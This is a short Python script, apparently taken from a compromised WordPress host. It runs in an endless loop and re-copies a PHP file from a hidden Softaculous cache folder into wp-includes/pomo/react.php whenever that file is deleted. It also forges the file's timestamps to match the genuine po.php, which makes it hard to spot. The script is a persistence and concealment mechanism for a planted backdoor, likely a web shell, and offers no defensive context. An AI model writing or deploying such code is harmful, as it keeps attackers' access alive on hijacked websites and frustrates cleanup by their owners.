import shutil
import os
import time

backup_php = "/home/foxlogde/.softaculous/.cache/logs.php"
restore_to = "/home/foxlogde/public_html/wp-includes/pomo/react.php"
copy_time_from = "/home/foxlogde/public_html/wp-includes/pomo/po.php"

while True:
    try:
        if not os.path.exists(restore_to):
            shutil.copy2(backup_php, restore_to)

            ref_stat = os.stat(copy_time_from)
            os.utime(restore_to, (ref_stat.st_atime, ref_stat.st_mtime))

        time.sleep(10)
    except:
        time.sleep(10)
